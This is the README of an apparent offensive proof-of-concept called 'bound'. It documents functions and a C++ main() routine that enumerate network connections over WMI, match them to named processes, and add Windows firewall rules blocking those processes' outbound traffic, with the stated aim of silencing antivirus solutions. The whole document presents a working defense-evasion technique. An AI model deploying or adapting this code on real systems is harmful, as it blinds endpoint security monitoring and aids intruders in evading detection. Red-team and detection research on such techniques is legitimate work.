# bound

`bound` is a **PoC** for a high-privilege evasion technique that consists in blocking outbound connections made by AV solutions by setting firewall rules.


The project includes several documented functions, here is a rundown:

- `enumConnectionsWMI` - enumerate all the active network connections using the Windows Management Instrumentation (WMI)
- `getImageFileName` - get image filename of a given process (`getImageFileName(3912) returns "C:\Windows\System32\svchost.exe"`)
- `ipToRange` - convert IP to CIDR range (`ipToRange("192.168.1.8") returns -> "192.168.0.0/16"`)
- `getRandomRule` - get a random firewall rule (both name and description) in a Rule object from a vector of rules
- `filterConnections` - check if vector of all active connections contain the PIDs of the processes to block
- `filterProcesses` - filter running processes to get vector of PIDs of a list of processes
- `setFWRule` - add a new firewall rule using the Windows Firewall with Advanced Security API


The provided `main` function shows a typical use of the library

```cpp
int main() {
	printf("[~] starting bound\n");

	std::vector<NetworkConnection> allConnections;
	std::vector<NetworkConnection> connectionsToBlock;
	std::vector<DWORD> foundPIDs;

	// fill this vector will all the processes to block
	std::vector<std::wstring> processesToBlock = { L"svchost.exe" };

	if (!enumConnectionsWMI(allConnections)) {
		std::cout << "[!] Error while enumerating WMI connections" << std::endl;
		return 1;
	}

	if (!filterProcesses(processesToBlock, foundPIDs) || foundPIDs.empty()) {
		std::cout << "[!] Error while filtering processes" << std::endl;
		return 1;
	}

	filterConnections(foundPIDs, allConnections, connectionsToBlock);
	std::cout << "[~] Found " << connectionsToBlock.size() << " connections to block" << std::endl;

	for (const auto& connection : connectionsToBlock) {
		std::wstring fullPath = getImageFileName(connection.owningProcess);
		std::wstring ipRange = ipToRange(connection.remoteAddress);
		std::wcout << "[~] Setting rule for " << fullPath << " and range " << ipRange << std::endl;

		if (!setFWRule(fullPath, ipRange))
			std::wcout << "[!] Failed setting rule for " << fullPath << " and range " << ipRange << std::endl;
	}

	return 0;
}
```

1. Enumerate **all** the active connections using WMI
2. Find the PID of all the processes to block
3. Filter the network connections related to these processes
4. Set firewall rules for the resulting connections
